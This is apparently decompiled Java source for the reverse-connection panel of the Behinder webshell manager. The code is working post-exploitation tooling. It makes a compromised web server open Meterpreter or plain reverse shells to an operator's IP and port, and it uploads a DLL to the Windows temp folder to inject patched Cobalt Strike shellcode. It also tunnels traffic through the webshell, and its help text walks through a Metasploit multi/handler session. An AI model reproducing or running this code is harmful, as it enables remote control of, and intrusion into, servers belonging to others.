package net.rebeyond.behinder.ui.controller;

import java.io.ByteArrayInputStream;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import javafx.application.Platform;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.CheckBox;
import javafx.scene.control.Label;
import javafx.scene.control.RadioButton;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.Toggle;
import javafx.scene.control.ToggleGroup;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import net.rebeyond.behinder.core.IShellService;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONArray;
import org.json.JSONObject;

public class ReverseViewController {
   private ShellManager shellManager;
   @FXML
   private TextField reverseIPText;
   @FXML
   private TextField reversePortText;
   @FXML
   private RadioButton reverseTypeMeterRadio;
   @FXML
   private RadioButton reverseTypeShellRadio;
   @FXML
   private RadioButton reverseTypeColbatRadio;
   @FXML
   private Button reverseButton;
   @FXML
   private TextArea reverseHelpTextArea;
   @FXML
   private CheckBox isolatedCheckBox;
   private IShellService currentShellService;
   private JSONObject shellEntity;
   private JSONObject effectShellEntity;
   private List<Thread> reversePortMapThreadList = new ArrayList();
   private List<Thread> workList;
   Map<String, String> basicInfoMap;
   private Label statusLabel;
   private List<ReversePortMapWorker> ReversePortMapWorkerList = new ArrayList();
   private String helpContentTemplate = "root@silver:/tmp# msfconsole\r\nmsf > use exploit/multi/handler \r\nmsf exploit(multi/handler) > set payload %s\r\npayload => %s\r\nmsf exploit(multi/handler) > show options\r\n\r\nPayload options (%s):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST                   yes       The listen address (an interface may be specified)\r\n   LPORT  4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Wildcard Target\r\n\r\n\r\nmsf exploit(multi/handler) > set lhost 0.0.0.0\r\nlhost => 0.0.0.0\r\nmsf exploit(multi/handler) > exploit \r\n\r\n[*] Started reverse TCP handler on 0.0.0.0:4444 \r\n[*] Sending stage (53859 bytes) to 119.3.72.174\r\n[*] Meterpreter session 1 opened (192.168.0.166:4444 -> 119.3.72.174:47157) at 2018-08-23 11:03:41 +0800\r\n\r\nmeterpreter > ";
   private Map<String, Map<String, String>> payloadList;

   public void init(IShellService shellService, List<Thread> workList, Label statusLabel, Map<String, String> basicInfoMap) {
      this.currentShellService = shellService;
      this.shellEntity = shellService.getShellEntity();
      this.effectShellEntity = shellService.getEffectShellEntity();
      this.workList = workList;
      this.basicInfoMap = basicInfoMap;
      this.statusLabel = statusLabel;
      this.initReverseView();
   }

   private void initPayloadList() {
      Map<String, Map<String, String>> payloadList = new HashMap();
      Map<String, String> meterPayloadList = new HashMap();
      meterPayloadList.put("jsp", "java/meterpreter/reverse_tcp");
      meterPayloadList.put("php", "php/meterpreter/reverse_tcp");
      meterPayloadList.put("aspx", "windows/meterpreter/reverse_tcp");
      payloadList.put("meter", meterPayloadList);
      Map<String, String> shellPayloadList = new HashMap();
      shellPayloadList.put("jsp", "java/jsp_shell_reverse_tcp");
      shellPayloadList.put("php", "php/reverse_php");
      shellPayloadList.put("aspx", "windows/shell/reverse_tcp");
      payloadList.put("shell", shellPayloadList);
      payloadList.put("cs", meterPayloadList);
      this.payloadList = payloadList;
   }

   private void initReverseView() {
      this.initPayloadList();
      this.initHelpContent();
      ToggleGroup radioGroup = new ToggleGroup();
      this.reverseTypeMeterRadio.setToggleGroup(radioGroup);
      this.reverseTypeShellRadio.setToggleGroup(radioGroup);
      this.reverseTypeColbatRadio.setToggleGroup(radioGroup);
      this.reverseTypeMeterRadio.setUserData("meter");
      this.reverseTypeShellRadio.setUserData("shell");
      this.reverseTypeColbatRadio.setUserData("cs");
      radioGroup.selectedToggleProperty().addListener(new ChangeListener<Toggle>() {
         public void changed(ObservableValue<? extends Toggle> observable, Toggle oldValue, Toggle newValue) {
            String reverseType = newValue.getUserData().toString();
            ReverseViewController.this.updateHelpContent(reverseType);
         }
      });
      radioGroup.selectToggle(this.reverseTypeShellRadio);

      try {
         ImageView icon = new ImageView();
         icon.setImage(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/reverse.png"))));
         icon.setFitHeight(14.0);
         icon.setPreserveRatio(true);
         this.reverseButton.setGraphic(icon);
      } catch (Exception var3) {
      }

      this.reverseButton.setOnAction((event) -> {
         String targetIP = this.reverseIPText.getText();
         String targetPort = this.reversePortText.getText();
         if (Utils.checkIP(targetIP) && Utils.checkPort(targetPort)) {
            Runnable runner;
            Thread worker;
            if (!this.reverseButton.getText().equals("关闭")) {
               runner = () -> {
                  boolean isPortMapTunnel = false;

                  try {
                     String actualTargetIP = targetIP;
                     RadioButton currentTypeRadio = (RadioButton)radioGroup.getSelectedToggle();
                     if (currentTypeRadio == null) {
                        Platform.runLater(() -> {
                           this.statusLabel.setText("请先选择反弹类型。");
                        });
                        return;
                     }

                     if (!targetIP.equals("127.0.0.1") && !targetIP.equals("localhost")) {
                        if (this.isolatedCheckBox.isSelected()) {
                           this.startReversePortMap(targetIP, targetPort);
                           isPortMapTunnel = true;
                           actualTargetIP = "127.0.0.1";
                        }
                     } else {
                        this.startReversePortMap("127.0.0.1", targetPort);
                        isPortMapTunnel = true;
                     }

                     boolean finalIsPortMapTunnel = isPortMapTunnel;
                     Platform.runLater(() -> {
                        if (finalIsPortMapTunnel) {
                           this.reverseButton.setText("关闭");
                        }

                     });
                     String type = currentTypeRadio.getUserData().toString();
                     JSONObject resultObj = null;
                     String statusx;
                     if (type.equals("cs")) {
                        statusx = (String)this.basicInfoMap.get("osInfo");
                        if (!Utils.isWindows(this.basicInfoMap)) {
                           Platform.runLater(() -> {
                              Utils.showErrorMessage("提示", "cs上线暂不支持非windows平台服务端");
                           });
                           return;
                        }

                        if (this.effectShellEntity.getString("type").equals("php")) {
                           Platform.runLater(() -> {
                              Utils.showErrorMessage("提示", "cs上线暂不支持php服务端");
                           });
                           return;
                        }

                        String remoteUploadPath = "c:/windows/temp/" + Utils.getRandomString((new Random()).nextInt(10)) + ".log";
                        if (this.effectShellEntity.getString("type").equals("jsp")) {
                           short portByteIndex;
                           byte[] nativeLibraryFileContent;
                           byte[] payloadFileContent;
                           int num;
                           if (((String)this.basicInfoMap.get("arch")).toString().indexOf("64") >= 0) {
                              portByteIndex = 274;
                              nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x64.dll");
                              payloadFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/shellcode/cs.payload.64");
                              num = Integer.parseInt(targetPort);
                              payloadFileContent[portByteIndex] = (byte)(num & 255);
                              payloadFileContent[portByteIndex + 1] = (byte)((num & '\uff00') >> 8);
                              payloadFileContent = Utils.mergeBytes(payloadFileContent, actualTargetIP.getBytes());
                              payloadFileContent = Utils.mergeBytes(payloadFileContent, new byte[]{0, 0, 0, 0, 0});
                              this.currentShellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
                              resultObj = this.currentShellService.executePayload(remoteUploadPath, Base64.getEncoder().encodeToString(payloadFileContent));
                              this.currentShellService.deleteFile(remoteUploadPath);
                           } else {
                              portByteIndex = 196;
                              nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x32.dll");
                              payloadFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/shellcode/cs.payload.32");
                              num = Integer.parseInt(targetPort);
                              payloadFileContent[portByteIndex] = (byte)(num & 255);
                              payloadFileContent[portByteIndex + 1] = (byte)((num & '\uff00') >> 8);
                              payloadFileContent = Utils.mergeBytes(payloadFileContent, actualTargetIP.getBytes());
                              payloadFileContent = Utils.mergeBytes(payloadFileContent, new byte[]{0, 0, 0, 0, 0});
                              this.currentShellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
                              resultObj = this.currentShellService.executePayload(remoteUploadPath, Base64.getEncoder().encodeToString(payloadFileContent));
                              this.currentShellService.deleteFile(remoteUploadPath);
                           }
                        } else if (this.effectShellEntity.getString("type").equals("aspx")) {
                           resultObj = this.currentShellService.connectBack(type, actualTargetIP, targetPort);
                           String status = resultObj.getString("status");
                           if (status.equals("fail")) {
                              JSONObject finalResultObj = resultObj;
                              Platform.runLater(() -> {
                                 String msg = finalResultObj.getString("msg");
                                 this.statusLabel.setText("反弹失败:" + msg);
                              });
                           } else {
                              Platform.runLater(() -> {
                                 this.statusLabel.setText("反弹成功。");
                              });
                           }
                        }
                     } else {
                        Thread.sleep(2000L);
                        resultObj = this.currentShellService.connectBack(type, actualTargetIP, targetPort);
                     }

                     statusx = resultObj.getString("status");
                     if (statusx.equals("fail")) {
                        JSONObject finalResultObj1 = resultObj;
                        Platform.runLater(() -> {
                           String msg = finalResultObj1.getString("msg");
                           this.statusLabel.setText("反弹失败:" + msg);
                        });
                     } else {
                        Platform.runLater(() -> {
                           this.statusLabel.setText("反弹成功。");
                        });
                     }
                  } catch (Exception var16) {
                     var16.printStackTrace();
                     Platform.runLater(() -> {
                        this.statusLabel.setText("操作失败:" + var16.getMessage());
                     });
                  }

               };
               worker = new Thread(runner);
               this.workList.add(worker);
               worker.start();
            } else {
               this.reverseButton.setText("给我连");
               Iterator var5 = this.ReversePortMapWorkerList.iterator();

               while(var5.hasNext()) {
                  ReversePortMapWorker reversePortMapWorker = (ReversePortMapWorker)var5.next();
                  reversePortMapWorker.stop();
               }

               this.ReversePortMapWorkerList.clear();
               runner = () -> {
                  try {
                     this.currentShellService.stopReversePortMap(targetPort);
                  } catch (Exception var3) {
                  }

               };
               worker = new Thread(runner);
               this.workList.add(worker);
               worker.start();
            }
         } else {
            Utils.showErrorMessage("提示", "IP或端口格式错误，请查证后再试");
         }
      });
   }

   private void initHelpContent() {
      this.reverseHelpTextArea.setText("root@silver:/tmp# msfconsole\r\nmsf > use exploit/multi/handler \r\nmsf exploit(multi/handler) > set payload %s\r\npayload => %s\r\nmsf exploit(multi/handler) > show options\r\n\r\nPayload options (%s):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST                   yes       The listen address (an interface may be specified)\r\n   LPORT  4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Wildcard Target\r\n\r\n\r\nmsf exploit(multi/handler) > set lhost 0.0.0.0\r\nlhost => 0.0.0.0\r\nmsf exploit(multi/handler) > exploit \r\n\r\n[*] Started reverse TCP handler on 0.0.0.0:4444 \r\n[*] Sending stage (53859 bytes) to 119.3.72.174\r\n[*] Meterpreter session 1 opened (192.168.0.166:4444 -> 119.3.72.174:47157) at 2018-08-23 11:03:41 +0800\r\n\r\nmeterpreter > ");
   }

   private void updateHelpContent(String reverseType) {
      String helpContent = "";
      if (reverseType.equals("cs")) {
         helpContent = "冰蝎支持Java和Aspx版本的CobaltStrike一键上线功能，采用windows/beacon_https/reverse_https上线方式。\r\n因为冰蝎采用注入JVM进程方式来植入代码，如果需要退出cs会话，需先将cs会话迁移至其他进程再退出，避免JVM进程停止。";
         this.reverseHelpTextArea.setText(helpContent);
      } else {
         String shellType = this.effectShellEntity.getString("type");
         String payloadName = (String)((Map)this.payloadList.get(reverseType)).get(shellType);
         helpContent = String.format(this.helpContentTemplate, payloadName, payloadName, payloadName);
      }

      this.reverseHelpTextArea.setText(helpContent);
   }

   private void startReversePortMap(String listenIP, String listenPort) {
      Runnable worker = () -> {
         try {
            JSONObject result = new JSONObject();
            if (this.effectShellEntity.get("type").equals("php")) {
               result.put("status", (Object)"success");
               Runnable backgroudRunner = () -> {
                  try {
                     this.currentShellService.createReversePortMap(listenPort);
                  } catch (Exception var3) {
                  }

               };
               (new Thread(backgroudRunner)).start();
               Thread.sleep(2000L);
            } else {
               result = this.currentShellService.createReversePortMap(listenPort);
            }

            if (result.get("status").equals("success")) {
               result = this.currentShellService.listReversePortMap();
               Map<String, Object> paramMap = new HashMap();
               paramMap.put("listenIP", listenIP);
               paramMap.put("listenPort", listenPort);
               ReversePortMapWorker reversePortMapWorkerDaemon = new ReversePortMapWorker("daemon", paramMap);
               this.ReversePortMapWorkerList.add(reversePortMapWorkerDaemon);
               Thread reversePortMapWorker = new Thread(reversePortMapWorkerDaemon);
               reversePortMapWorker.start();
               this.reversePortMapThreadList.add(reversePortMapWorker);
               this.workList.add(reversePortMapWorker);
               Platform.runLater(() -> {
                  this.statusLabel.setText("通信隧道创建成功。");
               });
            } else {
               String msg = result.getString("msg");
               Platform.runLater(() -> {
                  this.statusLabel.setText("通信隧道创建失败：" + msg);
               });
            }
         } catch (Exception var7) {
            Platform.runLater(() -> {
               this.statusLabel.setText("通信隧道创建失败：" + var7.getMessage());
            });
         }

      };
      Thread woker = new Thread(worker);
      woker.start();
      this.workList.add(woker);
   }

   class ReversePortMapWorker implements Runnable {
      private String threadType;
      private Map<String, Object> paramMap;
      private Map<String, Map<String, Object>> socketMetaList = new HashMap();

      public ReversePortMapWorker(String threadType, Map<String, Object> paramMap) {
         this.threadType = threadType;
         this.paramMap = paramMap;
      }

      public void stop() {
         Iterator var1 = this.socketMetaList.keySet().iterator();

         while(var1.hasNext()) {
            String key = (String)var1.next();
            Socket socket = (Socket)((Map)this.socketMetaList.get(key)).get("socket");

            try {
               socket.close();
            } catch (Exception var5) {
            }
         }

         this.socketMetaList = null;
         var1 = ReverseViewController.this.reversePortMapThreadList.iterator();

         while(var1.hasNext()) {
            Thread thread = (Thread)var1.next();
            thread.start();
         }

      }

      public void run() {
         int bytesRead;
         if (this.threadType.equals("daemon")) {
            String listenIP = this.paramMap.get("listenIP").toString();
            int listenPort = Integer.parseInt(this.paramMap.get("listenPort").toString());

            while(true) {
               try {
                  JSONObject result = ReverseViewController.this.currentShellService.listReversePortMap();
                  JSONArray socketArr = new JSONArray(result.getString("msg"));
                  if (socketArr.length() == 0) {
                     break;
                  }

                  for(bytesRead = 0; bytesRead < socketArr.length(); ++bytesRead) {
                     JSONObject socketObj = socketArr.getJSONObject(bytesRead);
                     String socketHashx = socketObj.getString("socketHash");
                     if (socketHashx.startsWith("reverseportmap_socket") && !this.socketMetaList.containsKey(socketHashx)) {
                        Map<String, Object> socketMetax = new HashMap();
                        socketMetax.put("status", "ready");
                        Socket socketx = new Socket(listenIP, listenPort);
                        socketMetax.put("status", "connected");
                        socketMetax.put("socket", socketx);
                        socketMetax.put("socketHash", socketHashx);
                        this.socketMetaList.put(socketHashx, socketMetax);
                        Map<String, Object> paramMap = new HashMap();
                        paramMap.put("listenIP", listenIP);
                        paramMap.put("listenPort", listenPort);
                        paramMap.put("socketMeta", socketMetax);
                        ReversePortMapWorker reversePortMapWorkerReader = ReverseViewController.this.new ReversePortMapWorker("read", paramMap);
                        ReversePortMapWorker reversePortMapWorkerWriter = ReverseViewController.this.new ReversePortMapWorker("write", paramMap);
                        ReverseViewController.this.ReversePortMapWorkerList.add(reversePortMapWorkerReader);
                        ReverseViewController.this.ReversePortMapWorkerList.add(reversePortMapWorkerWriter);
                        Thread reader = new Thread(reversePortMapWorkerReader);
                        Thread writer = new Thread(reversePortMapWorkerWriter);
                        ReverseViewController.this.reversePortMapThreadList.add(reader);
                        ReverseViewController.this.reversePortMapThreadList.add(writer);
                        ReverseViewController.this.workList.add(reader);
                        ReverseViewController.this.workList.add(writer);
                        reader.start();
                        writer.start();
                     }
                  }

                  Thread.sleep(3000L);
               } catch (Exception var21) {
                  break;
               }
            }
         } else {
            Map socketMeta;
            String socketHash;
            Socket socket;
            JSONObject var27;
            if (this.threadType.equals("read")) {
               socketMeta = (Map)this.paramMap.get("socketMeta");
               socketHash = socketMeta.get("socketHash").toString();
               socket = (Socket)socketMeta.get("socket");

               while(true) {
                  try {
                     JSONObject responseObj = ReverseViewController.this.currentShellService.readReversePortMapData(socketHash);
                     if (!responseObj.getString("status").equals("success")) {
                        try {
                           var27 = ReverseViewController.this.currentShellService.closeReversePortMap(socketHash);
                        } catch (Exception var17) {
                        }
                        break;
                     }

                     String msg = responseObj.getString("msg");
                     byte[] data = Base64.getDecoder().decode(msg);
                     socket.getOutputStream().write(data);
                     socket.getOutputStream().flush();
                  } catch (Exception var18) {
                     try {
                        var27 = ReverseViewController.this.currentShellService.stopReversePortMap(this.paramMap.get("listenPort").toString());
                     } catch (Exception var16) {
                     }
                     break;
                  }
               }
            } else if (this.threadType.equals("write")) {
               socketMeta = (Map)this.paramMap.get("socketMeta");
               socketHash = socketMeta.get("socketHash").toString();
               socket = (Socket)socketMeta.get("socket");

               while(true) {
                  try {
                     byte[] buf = new byte[20480];

                     for(bytesRead = socket.getInputStream().read(buf); bytesRead > 0; bytesRead = socket.getInputStream().read(buf)) {
                        ReverseViewController.this.currentShellService.writeReversePortMapData(Arrays.copyOfRange(buf, 0, bytesRead), socketHash);
                     }

                     return;
                  } catch (SocketTimeoutException var19) {
                  } catch (Exception var20) {
                     try {
                        var27 = ReverseViewController.this.currentShellService.stopReversePortMap(this.paramMap.get("listenPort").toString());
                     } catch (Exception var15) {
                     }
                     break;
                  }
               }
            }
         }

      }

      public void close(String listenIP, String listenPort) {
      }
   }
}
